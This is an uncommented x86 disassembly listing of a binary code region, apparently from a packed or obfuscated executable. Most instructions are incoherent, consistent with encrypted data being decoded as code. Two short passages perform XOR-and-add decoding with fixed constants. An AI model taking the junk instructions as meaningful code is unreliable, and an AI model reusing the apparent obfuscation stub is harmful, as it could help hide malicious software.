  407a10:	xchg   edi,eax
  407a11:	cs xor dl,bl
  407a14:	push   ebp
  407a15:	sbb    esp,DWORD PTR cs:[eax+ebp*1-0x52df7d6d]
  407a1d:	ds xchg edx,eax
  407a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a20:	cmp    eax,DWORD PTR [eax+0x50]
  407a23:	mov    al,ds:0xda30c6b
  407a28:	and    eax,0x9cd3f670
  407a2d:	and    BYTE PTR [ecx+0x71],0xe2
  407a31:	ss scas eax,DWORD PTR es:[edi]
  407a33:	push   esi
  407a34:	mov    ebp,esp
  407a36:	arpl   si,cx
  407a38:	jg     0x407a1f
  407a3a:	sti    
  407a3b:	icebp  
  407a3c:	pushf  
  407a3d:	mov    cl,0x65
  407a3f:	retf   0x7f63
  407a42:	rcr    BYTE PTR [esi],1
  407a44:	and    ah,BYTE PTR [ebx+0x59c8b327]
  407a4a:	cmp    al,0xc9
  407a4c:	adc    eax,0xcc7a5b99
  407a51:	pop    ss
  407a52:	sub    ah,bl
  407a54:	sub    BYTE PTR [ebx-0x17189fe0],0xf6
  407a5b:	das    
  407a5c:	xor    ebx,DWORD PTR [eax-0x6fff6e3b]
  407a62:	popa   
  407a63:	xchg   esp,eax
  407a64:	jae    0x407a9a
  407a66:	jns    0x407ad7
  407a68:	dec    ebp
  407a69:	dec    ebp
  407a6a:	sub    DWORD PTR [edx-0x56],ebx
  407a6d:	rol    BYTE PTR [esi-0x4f293c21],cl
  407a73:	xchg   edx,eax
  407a74:	cs popa 
  407a76:	mov    ebp,0x59942fa2
  407a7b:	dec    esp
  407a7c:	dec    eax
  407a7d:	inc    ebx
  407a7e:	repz addr16 push ds
  407a81:	int    0x7e
  407a83:	add    al,0xd3
  407a85:	mov    al,0xc7
  407a87:	xchg   DWORD PTR [ebx+esi*4+0x44713c3c],ebp
  407a8e:	push   cs
  407a8f:	add    eax,0x3b479e22
  407a94:	xchg   ecx,eax
  407a95:	jns    0x407afc
  407a97:	mov    esp,0x42b5123f
  407a9c:	into   
  407a9d:	and    ah,BYTE PTR [edx+0x57]
  407aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aa1:	push   ss
  407aa2:	loopne 0x407ac0
  407aa4:	jp     0x407ad1
  407aa6:	fcmovnb st,st(4)
  407aa8:	xor    DWORD PTR [ebx-0x2d],ebp
  407aab:	xor    esi,DWORD PTR [edi-0x61]
  407aae:	sahf   
  407aaf:	das    
  407ab0:	add    eax,0xb4ce8615
  407ab5:	or     bh,ch
  407ab7:	pop    ds
  407ab8:	mov    al,ds:0xb3caed54
  407abd:	xchg   esp,eax
  407abe:	sub    al,0x55
  407ac0:	and    eax,0xa9aabc65
  407ac5:	aaa    
  407ac6:	sbb    bl,al
  407ac8:	(bad)  
  407ac9:	sbb    eax,DWORD PTR [eax+0x68cbe795]
  407acf:	dec    edx
  407ad0:	rep stos DWORD PTR es:[edi],eax
  407ad2:	inc    esp
  407ad3:	adc    cl,ch
  407ad5:	outs   dx,DWORD PTR ds:[esi]
  407ad6:	test   eax,0xd93f117
  407adb:	repz xchg edx,eax
  407add:	xchg   edx,eax
  407ade:	add    BYTE PTR [esi-0x1e],cl
  407ae1:	ins    BYTE PTR es:[edi],dx
  407ae2:	or     ebx,DWORD PTR [esi]
  407ae4:	dec    ebx
  407ae5:	push   ecx
  407ae6:	out    dx,al
  407ae7:	mov    ds:0xc9e475ea,eax
  407aec:	inc    ebx
  407aed:	push   ss
  407aee:	adc    BYTE PTR [eax],ah
  407af0:	retf   0xbe95
  407af3:	and    bh,dh
  407af5:	cmp    eax,0x91d2902a
  407afa:	loope  0x407a87
  407afc:	inc    ebp
  407afd:	lock xor DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	test   DWORD PTR [edi],eax
  407b35:	sub    esp,ebx
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b2c
  407b40:	repz push ecx
  407b42:	xchg   esi,eax
  407b43:	sub    ebp,DWORD PTR ds:0x9ec3ab88
  407b49:	in     al,dx
  407b4a:	outs   dx,BYTE PTR ds:[esi]
  407b4b:	repnz mov edx,0xff84af15
  407b51:	sub    eax,ebx
  407b53:	mov    ecx,0xda38936c
  407b58:	dec    eax
  407b59:	mov    ch,0x21
  407b5b:	and    al,BYTE PTR [edx+edx*2-0xe]
  407b5f:	inc    edx
  407b60:	fcmovu st,st(7)
  407b62:	sbb    al,0xf1
  407b64:	add    ebx,DWORD PTR [ebp-0x37]
  407b67:	out    0xa3,eax
  407b69:	call   0x9a99:0x644fcf57
  407b70:	pop    esp
  407b71:	push   ds
  407b72:	cmp    BYTE PTR [ecx-0x3d341f4c],dh
  407b78:	aaa    
  407b79:	shl    BYTE PTR ds:0x2d9b68f3,cl
  407b7f:	or     BYTE PTR [edx-0x642dbdf9],ah
  407b85:	mov    eax,0x21d8743d
  407b8a:	push   es
  407b8b:	test   eax,0xa2bd2053
  407b90:	pop    esp
  407b91:	aam    0xb9
  407b93:	jo     0x407b64
  407b95:	aas    
  407b96:	jae    0x407be1
  407b98:	sub    bh,BYTE PTR [esi-0x16]
  407b9b:	bound  ebx,QWORD PTR [ecx+ecx*8-0x12eee7c0]
  407ba2:	outs   dx,BYTE PTR ds:[esi]
  407ba3:	xchg   ebp,eax
  407ba4:	inc    eax
  407ba5:	add    DWORD PTR [edx-0x71],eax
  407ba8:	je     0x407b66
  407baa:	pop    edi
  407bab:	popf   
  407bac:	push   ecx
  407bad:	mov    esi,0xb3cc45a5
  407bb2:	jae    0x407bb3
  407bb4:	mov    eax,0x42f22128
  407bb9:	or     dl,bh
  407bbb:	test   BYTE PTR [eax-0x4b],ah
  407bbe:	push   ecx
  407bbf:	push   eax
  407bc0:	or     al,0xa8
  407bc2:	pop    eax
  407bc3:	push   ebp
  407bc4:	pop    edi
  407bc5:	jmp    0x1b1afc58
  407bca:	stc    
  407bcb:	sub    edi,0x70fd8c9e
  407bd1:	cwde   
  407bd2:	add    eax,DWORD PTR [eax]
  407bd4:	xor    esi,ecx
  407bd6:	inc    edx
  407bd7:	popf   
  407bd8:	add    edi,ebx
  407bda:	cmp    bh,cl
  407bdc:	stos   BYTE PTR es:[edi],al
  407bdd:	dec    eax
  407bde:	mov    BYTE PTR [edx],bh
  407be0:	call   0x4e3e1118
  407be5:	hlt    
  407be6:	mov    WORD PTR [ecx+0x2],?
  407be9:	xchg   esi,eax
  407bea:	push   0x23
  407bec:	rcl    DWORD PTR [ecx-0x39],1
  407bef:	add    eax,0xba54a1e
  407bf4:	push   ebp
  407bf5:	clc    
  407bf6:	mov    al,ds:0xad6fa084
  407bfb:	scas   eax,DWORD PTR es:[edi]
  407bfc:	test   al,0x91
  407bfe:	inc    eax
  407bff:	dec    ecx
  407c00:	sub    eax,0x9b6d1a1a
  407c05:	cli    
  407c06:	push   edi
  407c07:	push   ss
  407c08:	es cmp eax,0xa2d767cc
  407c0e:	test   DWORD PTR [ebx+0x55],0x72a3eb87
  407c15:	pop    ebx
  407c16:	ds fisub WORD PTR fs:[edx]
  407c1a:	sbb    al,0xa
  407c1c:	mov    WORD PTR [ebx-0x1d],cs
  407c1f:	xor    edi,edx
  407c21:	out    0x5a,al
  407c23:	and    eax,0x70b82a1c
  407c28:	sbb    al,0xc9
  407c2a:	mov    bh,0x48
  407c2c:	pop    ebx
  407c2d:	mov    dl,BYTE PTR [ebp+0x3c5f1b31]
  407c33:	retf   0x841b
  407c36:	mov    WORD PTR [ecx-0x7dade3c3],es
  407c3c:	das    
  407c3d:	ins    DWORD PTR es:[edi],dx
  407c3e:	xchg   ecx,eax
  407c3f:	add    ah,BYTE PTR [edx]
  407c41:	adc    eax,esp
  407c43:	das    
  407c44:	jns    0x3d1853cd
  407c4a:	lahf   
  407c4b:	push   edi
  407c4c:	or     eax,0xe67e7a8f
  407c51:	mov    eax,DWORD PTR [ecx]
  407c53:	xor    DWORD PTR [esi-0x7ac783d0],edx
  407c59:	adc    ah,BYTE PTR [ebx+0x258d9d17]
  407c5f:	es xchg dl,al
  407c62:	stc    
  407c63:	adc    ch,BYTE PTR [eax+ecx*1-0x40]
  407c67:	mov    ch,0xd0
  407c69:	pusha  
  407c6a:	pop    esp
  407c6b:	adc    bh,ah
  407c6d:	add    al,0x5c
  407c6f:	js     0x407c3b
  407c71:	pushf  
  407c72:	pop    esp
  407c73:	into   
  407c74:	shl    esi,0xd9
  407c77:	lds    esp,FWORD PTR [edx+ecx*1-0x42]
  407c7b:	idiv   BYTE PTR [ebx+0x3f259e79]
  407c81:	mov    edi,0x24c5eb00
  407c86:	push   0xa78848bb
  407c8b:	pushf  
  407c8c:	(bad)  es:[esi-0x2f90205f]
  407c93:	in     al,0xd9
  407c95:	add    DWORD PTR [ebx],ebx
  407c97:	jl     0x407cad
  407c99:	pop    edi
  407c9a:	call   0x6f260bd4
  407c9f:	xchg   dh,bh
  407ca1:	aaa    
  407ca2:	dec    DWORD PTR [edx+edx*2+0x6c26fdb7]
  407ca9:	stos   BYTE PTR es:[edi],al
  407caa:	dec    esp
  407cab:	repz iret 
  407cad:	(bad)  
  407cae:	lods   eax,DWORD PTR ds:[esi]
  407caf:	dec    edi
  407cb0:	mov    cl,BYTE PTR [edi+0x51]
  407cb3:	mov    esi,0x67fd45a4
  407cb8:	sbb    DWORD PTR [edi],ebx
  407cba:	sahf   
  407cbb:	jle    0x407d03
  407cbd:	rcr    BYTE PTR [esi-0x588e247c],0x95
  407cc4:	fwait
  407cc5:	xchg   edx,eax
  407cc6:	cdq    
  407cc7:	push   0x49
  407cc9:	inc    esi
  407cca:	inc    ecx
  407ccb:	ret    
  407ccc:	clc    
  407ccd:	xchg   BYTE PTR [edi+eiz*8],al
  407cd0:	dec    ebx
  407cd1:	lahf   
  407cd2:	sahf   
  407cd3:	int    0x5a
  407cd5:	pop    ss
  407cd6:	mov    dl,0x30
  407cd8:	jg     0x407d05
  407cda:	cmp    ecx,DWORD PTR [esi]
  407cdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cdd:	lds    esp,FWORD PTR [eax-0x53ba7bc8]
  407ce3:	rol    edx,1
  407ce5:	inc    eax
  407ce6:	fwait
  407ce7:	pop    ecx
  407ce8:	aam    0x9
  407cea:	inc    edi
  407ceb:	scas   al,BYTE PTR es:[edi]
  407cec:	cs jae 0x407d5a
  407cef:	out    0xec,eax
  407cf1:	xchg   DWORD PTR [edi],ecx
  407cf3:	scas   eax,DWORD PTR es:[edi]
  407cf4:	dec    DWORD PTR [edi+0x32]
  407cf7:	sbb    BYTE PTR [esi],ch
  407cf9:	fistp  WORD PTR [ebx]
  407cfb:	and    BYTE PTR [esp+edx*8-0x51],dl
  407cff:	mov    fs,WORD PTR [esi]
  407d01:	dec    ecx
  407d02:	(bad)  
  407d03:	fiadd  DWORD PTR [ebx+ecx*4-0x6394c31]
  407d0a:	push   edi
  407d0b:	mov    dh,0x5b
  407d0d:	test   eax,0xe5ac74de
  407d12:	mov    ah,0x90
  407d14:	sub    eax,edi
  407d16:	and    ah,BYTE PTR [edi+0x735482b6]
  407d1c:	(bad)  
  407d1d:	ffree  st(5)
  407d1f:	adc    ah,bh
  407d21:	mov    BYTE PTR [eax],ch
  407d23:	rcl    DWORD PTR [esi+eax*2+0x6f07b147],cl
  407d2a:	mov    al,0xbc
  407d2c:	sub    esi,DWORD PTR [ecx-0x6d]
  407d2f:	mov    eax,ds:0x89dc79f6
  407d34:	push   eax
  407d35:	addr16 mov eax,ds:0x1ec5
  407d39:	pop    edi
  407d3a:	dec    al
  407d3c:	sub    al,0x3f
  407d3e:	mov    ah,0x36
  407d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d41:	(bad)  
  407d43:	and    eax,0xfe53ad7a
  407d48:	pusha  
  407d49:	mov    gs,eax
  407d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d4c:	jne    0x407cd4
  407d4e:	sub    esp,DWORD PTR [edx+0x24]
  407d51:	push   ss
  407d52:	inc    edi
  407d53:	mov    esp,0x8289786d
  407d58:	das    
  407d59:	lods   eax,DWORD PTR ds:[esi]
  407d5a:	or     ch,BYTE PTR [eax+esi*1+0x6f0c4e70]
  407d61:	and    BYTE PTR [ecx],0x5f
  407d64:	mov    al,ds:0xec4ded78
  407d69:	xor    BYTE PTR [ecx-0xdfeaab1],dh
  407d6f:	data16 or BYTE PTR [ecx-0x6f140b3],dl
  407d76:	lahf   
  407d77:	jecxz  0x407d63
  407d79:	push   ebp
  407d7a:	push   eax
  407d7b:	dec    ebp
  407d7c:	push   0x64
  407d7e:	retf   
  407d7f:	sbb    ch,al
  407d81:	mov    edi,0xb5f3b0be
  407d86:	into   
  407d87:	and    edx,DWORD PTR [ecx+0x21e63315]
  407d8d:	xchg   DWORD PTR [edx+0x2e8d57c7],ecx
  407d93:	test   eax,0x57746a07
  407d98:	call   0x5dd86937
  407d9d:	loopne 0x407e16
  407d9f:	idiv   BYTE PTR [eax-0x22]
  407da2:	pop    esi
  407da3:	call   0xe2fd2ca8
  407da8:	mov    esp,DWORD PTR [eax]
  407daa:	sti    
  407dab:	(bad)  
  407dad:	loopne 0x407d3a
  407daf:	stos   BYTE PTR es:[edi],al
  407db0:	or     cl,BYTE PTR [edi-0x4c]
  407db3:	add    al,0xdf
  407db5:	mov    ds:0xb695f38f,eax
  407dba:	mov    eax,0x3b76ea89
  407dbf:	xor    al,BYTE PTR [ecx]
  407dc1:	hlt    
  407dc2:	pop    eax
  407dc3:	mov    ds:0x5b29adba,al
  407dc8:	jne    0x407e2e
  407dca:	mov    ds,WORD PTR [ebp+0x6aa2b125]
  407dd0:	inc    ecx
  407dd1:	gs inc esi
  407dd3:	mov    ch,0xf9
  407dd5:	jnp    0x407e41
  407dd7:	daa    
  407dd8:	fcom   QWORD PTR [eax+0x3b75274f]
  407dde:	inc    esp
  407ddf:	push   eax
  407de0:	lea    edi,[edi+0x2f75f66d]
  407de6:	jmp    0xa0b852d6
  407deb:	dec    edi
  407dec:	or     eax,0x5f27bc2f
  407df1:	imul   DWORD PTR [esi-0x7c2de9fe]
  407df7:	jge    0x407d9c
  407df9:	ja     0x407d7e
  407dfb:	in     eax,dx
  407dfc:	push   ebx
  407dfd:	inc    esp
  407dfe:	nop
  407dff:	enter  0xb9e4,0x9c
  407e03:	cmp    al,0x9b
  407e05:	call   0x4d7f:0x2c4f264
  407e0c:	sbb    DWORD PTR [ecx],esi
  407e0e:	adc    eax,edx
  407e10:	loopne 0x407e7e
  407e12:	mov    al,ds:0x223716c9
  407e17:	out    0x53,eax
  407e19:	popf   
  407e1a:	adc    eax,0x509371d9
  407e1f:	mov    al,ds:0xac10762f
  407e24:	inc    edi
  407e25:	(bad)  
  407e26:	pop    ds
  407e27:	ja     0x407db4
  407e29:	dec    ebp
  407e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e2b:	enter  0xc346,0xe6
  407e2f:	repnz and eax,DWORD PTR [ebp-0x2a]
  407e33:	fdiv   QWORD PTR [ebp+ebx*2+0x30f9390f]
  407e3a:	mov    cs,ebp
  407e3c:	fbstp  TBYTE PTR [edx-0x2f964e2e]
  407e42:	fisub  DWORD PTR [esi+0x669c565a]
  407e48:	je     0x407ebe
  407e4a:	pusha  
  407e4b:	sub    DWORD PTR [ecx],edi
  407e4d:	stos   DWORD PTR es:[edi],eax
  407e4e:	mov    al,0x7a
  407e50:	inc    edx
  407e51:	mov    eax,DWORD PTR [edi-0x70]
  407e54:	pop    esi
  407e55:	push   0x297e33f4
  407e5a:	mov    dl,0xe9
  407e5c:	sub    DWORD PTR [ebx+eax*8-0x5e],ebp
  407e60:	test   eax,0x53e07e7f
  407e65:	dec    ebp
  407e66:	or     al,0xbd
  407e68:	xchg   BYTE PTR [esi],al
  407e6a:	adc    edi,DWORD PTR [ebx+0x5812d18a]
  407e70:	adc    al,0xb0
  407e72:	xchg   BYTE PTR [ebp-0x5a95b238],dl
  407e78:	xchg   edx,eax
  407e79:	outs   dx,BYTE PTR ds:[esi]
  407e7a:	mov    al,ds:0x3801770b
  407e7f:	fisubr DWORD PTR [esp+edi*4]
  407e82:	and    DWORD PTR [ebx],edx
  407e84:	pop    ebp
  407e85:	call   0x2f335d01
  407e8a:	jp     0x407e97
  407e8c:	xor    DWORD PTR [ebp+0x66103067],ebx
  407e92:	arpl   bx,di
  407e94:	add    al,0x5e
  407e96:	inc    ebx
  407e97:	int    0x65
  407e99:	imul   edi,DWORD PTR [edx-0x21],0x7d86e09c
  407ea0:	lods   al,BYTE PTR ds:[esi]
  407ea1:	and    al,0xce
  407ea3:	mov    ebx,esi
  407ea5:	jnp    0x407ee4
  407ea7:	jge    0x407ef7
  407ea9:	sub    eax,0x5b427f68
  407eae:	test   al,0xdd
  407eb0:	jo     0x407eb3
  407eb2:	imul   ch
  407eb4:	sub    eax,0x19d6f0a4
  407eb9:	clc    
  407eba:	int    0x32
  407ebc:	nop
  407ebd:	aas    
  407ebe:	test   eax,0xc1db6812
  407ec3:	cmp    ecx,DWORD PTR [edi]
  407ec5:	mov    ebp,0x47f6dddc
  407eca:	xor    BYTE PTR [ebp+0x38],al
  407ecd:	aas    
  407ece:	test   BYTE PTR [esi],ah
  407ed0:	into   
  407ed1:	jae    0x407f06
  407ed3:	stos   BYTE PTR es:[edi],al
  407ed4:	fdivr  st(3),st
  407ed6:	push   esi
  407ed7:	mov    bh,0x74
  407ed9:	fisubr DWORD PTR [edi+0x33]
  407edc:	push   ds
  407edd:	xchg   ebx,eax
  407ede:	push   eax
  407edf:	push   edx
  407ee0:	pop    eax
  407ee1:	or     DWORD PTR [edi+edi*1],ecx
  407ee4:	jle    0x407ec7
  407ee6:	xor    dh,BYTE PTR [edx]
  407ee8:	cld    
  407ee9:	popf   
  407eea:	punpcklwd mm1,DWORD PTR ds:0x5e84d311
  407ef1:	dec    ebp
  407ef2:	sbb    DWORD PTR [edx],ebp
  407ef4:	xchg   esi,eax
  407ef5:	pop    edi
  407ef6:	cmp    esi,DWORD PTR [ebx-0x4b]
  407ef9:	mov    WORD PTR ds:0x4bf51a84,ss
  407eff:	aad    0x18
  407f01:	mov    esp,0x8fc85636
  407f06:	dec    eax
  407f07:	pop    ecx
  407f08:	cmp    BYTE PTR [esi],dh
  407f0a:	xor    al,0xb
  407f0c:	dec    edx
  407f0d:	adc    BYTE PTR [esi+0x73b66a8],al
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407fcd
  407f78:	leave  
  407f79:	test   DWORD PTR [edi-0x56],ebx
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407fba
  407f84:	dec    esi
  407f85:	rol    DWORD PTR [esi-0x60f388d5],0x98
  407f8c:	push   0xf26401ed
  407f91:	std    
  407f92:	popf   
  407f93:	jne    0x407f34
  407f95:	add    bl,BYTE PTR [eax+0x5e323150]
  407f9b:	and    ecx,DWORD PTR [edi+0x31]
  407f9e:	adc    esi,esi
  407fa0:	(bad)  
  407fa1:	jbe    0x407fdf
  407fa3:	xor    DWORD PTR [edx],esi
  407fa5:	icebp  
  407fa6:	lahf   
  407fa7:	out    0x1f,al
  407fa9:	aas    
  407faa:	loop   0x40800c
  407fac:	mov    DWORD PTR [ebx],edi
  407fae:	or     al,0x87
  407fb0:	repz bnd jne 0x407f3c
  407fb4:	jne    0x407fe7
  407fb6:	xor    ah,BYTE PTR [edx]
  407fb8:	push   edx
  407fb9:	dec    esi
  407fba:	mov    ch,0x95
  407fbc:	(bad)  [ecx-0x6bce5d91]
  407fc2:	pop    eax
  407fc3:	loop   0x407f7e
  407fc5:	(bad)  
  407fc7:	adc    eax,0xad77131d
  407fcc:	sub    esp,DWORD PTR [edx+0x2b]
  407fcf:	retf   
  407fd0:	mov    ch,0x7d
  407fd2:	add    edx,ebp
  407fd4:	arpl   WORD PTR [esi+0x2e],cx
  407fd7:	mov    dh,0xc6
  407fd9:	and    DWORD PTR [edx+0x7fdf2c4e],0x74
  407fe0:	add    BYTE PTR [edi+0xfb6d6c0],cl
  407fe6:	push   0xffffffda
  407fe8:	bound  esp,QWORD PTR [eax]
  407fea:	pop    edx
  407feb:	je     0x407fa4
  407fed:	xor    cl,BYTE PTR [ecx-0x45]
  407ff0:	mov    ah,0x3d
  407ff2:	mov    eax,ds:0xb178d21b
  407ff7:	in     eax,0xfb
  407ff9:	test   al,0x64
  407ffb:	push   es
  407ffc:	lds    ebx,FWORD PTR [ecx]
  407ffe:	mov    bh,0xa4
  408000:	lock xchg ecx,eax
  408002:	ret    
  408003:	pop    esp
  408005:	mov    WORD PTR [ecx],?
  408007:	out    0x1e,al
  408009:	xchg   dl,cl
  40800b:	leave  
  40800c:	add    ch,BYTE PTR [edi-0x62863c9]
  408012:	mov    dl,0x68
  408014:	je     0x408052
  408016:	jbe    0x407fa0
  408018:	mov    dl,0x49
  40801a:	dec    ebp
  40801b:	pop    ds
  40801c:	lds    ecx,FWORD PTR [eax-0x834d5ff]
  408022:	pop    ss
  408023:	bound  esi,QWORD PTR [eax+0xcbdf143]
  408029:	aas    
  40802a:	pop    ds
  40802b:	mov    esi,0x51e67808
  408030:	mov    cl,0xc
  408032:	jl     0x408016
  408034:	xchg   esi,eax
  408035:	sahf   
  408036:	push   esp
  408037:	fstp   DWORD PTR [eax+0x39]
  40803a:	cmp    bh,bl
  40803c:	and    ebx,DWORD PTR [edx-0x499d801a]
  408042:	ffree  st(6)
  408044:	inc    ecx
  408045:	jno    0x4080bd
  408047:	cmp    ebx,DWORD PTR [esi-0x1dc49878]
  40804d:	add    al,0xbc
  40804f:	clc    
  408050:	jge    0x408094
  408052:	adc    edi,ebp
  408054:	or     al,0x58
  408056:	push   edx
  408057:	mov    bh,0x81
  408059:	imul   ebp,DWORD PTR [bp+di+0x2c8a],0xffffffd3
  40805f:	jns    0x4080c6
  408061:	add    eax,0xf2b9b828
  408066:	and    al,0x50
  408068:	ds loop 0x408073
  40806b:	add    DWORD PTR [ebx],esi
  40806d:	cwde   
  40806e:	dec    esp
  40806f:	mov    cs,WORD PTR [esi]
  408071:	add    cl,bl
  408073:	ins    BYTE PTR es:[edi],dx
  408074:	pop    ebp
  408075:	jmp    0x72f7:0xba8dd020
  40807c:	daa    
  40807d:	out    dx,al
  40807e:	cld    
  40807f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408080:	push   ebp
  408081:	shr    BYTE PTR [eax-0xa],1
  408084:	repz add eax,0xa9cdaa33
  40808a:	rcr    DWORD PTR [edx-0x32b91a74],cl
  408090:	(bad)  
  408091:	call   0xa9ebefd3
  408096:	popa   
  408097:	jmp    0x830:0x4c620bac
  40809e:	pop    ds
  40809f:	mov    al,ds:0x33803085
  4080a4:	imul   edx,DWORD PTR [esi+eax*4],0x25
  4080a8:	gs pop edx
  4080aa:	mov    bh,0xa
  4080ac:	xchg   ecx,eax
  4080ad:	ins    DWORD PTR es:[edi],dx
  4080ae:	sahf   
  4080af:	imul   esi
  4080b1:	daa    
  4080b2:	addr16 jne 0x408040
  4080b5:	das    
  4080b6:	dec    ebx
  4080b7:	jb     0x4080ea
  4080b9:	call   0xae48:0xf38ab9a1
  4080c0:	mov    eax,ds:0x6695d43a
  4080c5:	or     eax,0xcbdf4ff3
  4080ca:	pop    ecx
  4080cb:	sar    DWORD PTR [edi+0x6b8c527],cl
  4080d1:	ret    
  4080d2:	sti    
  4080d3:	sbb    BYTE PTR [edx+0x74],cl
  4080d6:	cmp    DWORD PTR [ebp+0x15],ecx
  4080d9:	add    BYTE PTR [edx-0x4e46b93c],bl
  4080df:	test   al,0xa1
  4080e1:	shr    DWORD PTR [edi+0x9],1
  4080e4:	(bad)  
  4080e6:	test   al,0x91
  4080e8:	daa    
  4080e9:	(bad)  
  4080ea:	fisub  DWORD PTR [edi]
  4080ec:	popa   
  4080ed:	push   esp
  4080ee:	fcmovb st,st(0)
  4080f0:	jmp    0x408110
  4080f2:	retf   0xf3f4
  4080f5:	mov    ch,0xaf
  4080f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f8:	dec    ebx
  4080fa:	cli    
  4080fb:	jb     0x40812b
  4080fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080fe:	call   FWORD PTR [ebp-0xc81180a]
  408104:	out    dx,eax
  408105:	(bad)  
  408106:	jmp    0x2e7d2952
  40810b:	mov    bl,0x43
  40810d:	aam    0xdb
  40810f:	dec    edi
  408110:	add    eax,0xf4816338
  408115:	sub    BYTE PTR [eax+0x17],dl
  408118:	cmova  edx,DWORD PTR [ebx+0x2acee078]
  40811f:	or     DWORD PTR [ebx-0x6f],0xd76de63
  408126:	cmp    al,0xd1
  408128:	mov    edi,0xcbcc2210
  40812d:	adc    ecx,DWORD PTR [esi+ebp*2]
  408130:	inc    ebx
  408131:	add    eax,DWORD PTR [esi]
  408133:	(bad)  
  408135:	sbb    DWORD PTR [edi-0x1d],ecx
  408138:	inc    edi
  408139:	out    dx,eax
  40813a:	jl     0x4081b7
  40813c:	sub    BYTE PTR [ebp+0x59],ah
  40813f:	jb     0x4080d7
  408141:	sub    edx,DWORD PTR [edx]
  408143:	sub    BYTE PTR [eax+eax*8-0x5d],ah
  408147:	(bad)  
  408148:	push   ss
  408149:	cmp    DWORD PTR [ebx],ebx
  40814b:	pop    es
  40814c:	inc    edi
  40814d:	xor    eax,0x664eb52
  408152:	inc    edi
  408153:	pushf  
  408154:	or     esi,DWORD PTR [edi]
  408156:	out    dx,eax
  408157:	(bad)  
  408158:	mov    ds,WORD PTR [edx-0x4b]
  40815b:	push   ss
  40815c:	sub    eax,0x9e307ed0
  408161:	xlat   BYTE PTR ds:[ebx]
  408162:	mov    ecx,0xecf23d8e
  408167:	push   ebp
  408168:	push   ebx
  408169:	xchg   esp,eax
  40816a:	push   edx
  40816b:	test   al,0xe1
  40816d:	repnz fmul QWORD PTR [edx]
  408170:	mov    ?,eax
  408172:	inc    ecx
  408173:	push   edx
  408174:	lock imul ebx,DWORD PTR [edx],0x9ae5f265
  40817b:	sub    al,0x22
  40817d:	xlat   BYTE PTR ds:[ebx]
  40817e:	mov    edx,0x3d4f0689
  408183:	test   eax,0xed19db5e
  408188:	fsubr  st(5),st
  40818a:	cli    
  40818b:	rcl    BYTE PTR [esi+0x6f],0xfc
  40818f:	sub    al,BYTE PTR [ecx]
  408191:	mov    al,ds:0x1bea9c60
  408196:	(bad)  
  408197:	leave  
  408198:	inc    edi
  408199:	or     esi,edx
  40819b:	(bad)  
  40819c:	scas   eax,DWORD PTR es:[edi]
  40819d:	mov    esi,0xc01cf41
  4081a2:	out    0x6b,eax
  4081a4:	pop    ecx
  4081a5:	mov    ds:0xf5097ab8,eax
  4081aa:	scas   al,BYTE PTR es:[edi]
  4081ab:	outs   dx,BYTE PTR ds:[esi]
  4081ac:	mul    BYTE PTR [esp-0x7]
  4081b0:	pop    esi
  4081b1:	push   0x1026e627
  4081b6:	cmp    bl,BYTE PTR [ebx]
  4081b8:	test   al,0xde
  4081ba:	ror    DWORD PTR [edx+0x64714311],1
  4081c0:	mov    ch,BYTE PTR [eax-0x6b3c19ee]
  4081c6:	adc    dl,BYTE PTR ds:0x7372ad3d
  4081cc:	loopne 0x40815e
  4081ce:	cmp    ebp,DWORD PTR [edi+edx*4-0x1b238916]
  4081d5:	inc    edx
  4081d6:	or     esp,DWORD PTR [eax-0x8a2111]
  4081dc:	inc    eax
  4081dd:	jne    0x408245
  4081df:	fidivr DWORD PTR [ebx-0x31]
  4081e2:	add    BYTE PTR ds:0xf1926a1a,dl
  4081e8:	in     eax,0x65
  4081ea:	jbe    0x40819a
